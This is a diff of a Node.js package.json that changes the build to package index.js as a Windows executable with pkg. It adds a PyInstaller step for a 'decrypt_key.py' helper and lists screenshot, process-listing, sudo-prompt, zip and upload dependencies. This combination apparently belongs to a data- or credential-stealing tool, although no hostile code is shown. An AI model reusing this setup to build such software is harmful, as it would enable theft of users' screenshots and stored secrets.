@@ -2,26 +2,24 @@
   "main": "./index.js",
   "scripts": {
     "dev": "node index.js",
-    "build": "nexe -b -t x64-18.12.1 -i index.js -o index.exe",
+    "build": "yarn build:dkp && yarn build:ico && yarn build:exe",
+    "build:exe": "pkg index.js -t x64 -o index.exe --verbose",
+    "build:dkp": "cd util/decrypt-key && pyinstaller --onefile --distpath . decrypt_key.py",
     "build:ico": "png-to-ico assets/icon.png > icon.ico"
   },
   "dependencies": {
     "alert": "https://github.com/NetherMCtv/alert",
     "axios": "0.27.2",
-    "crypto-js": "^4.1.1",
     "filesize": "^10.0.6",
     "form-data": "^4.0.0",
     "jszip": "^3.10.1",
     "moment": "^2.29.4",
-    "nexe": "^4.0.0-rc.2",
+    "pkg": "^5.8.0",
     "ps-list": "^8.1.0",
     "screenshot-desktop": "^1.12.7",
-    "sqlite3": "^5.1.4",
     "sudo-prompt": "^9.2.1"
   },
   "devDependencies": {
-    "@types/crypto-js": "^4.1.1",
-    "@types/leveldown": "^4.0.3",
     "@types/node": "^18.11.17",
     "@types/screenshot-desktop": "^1.12.0",
     "eslint": "8.22.0",
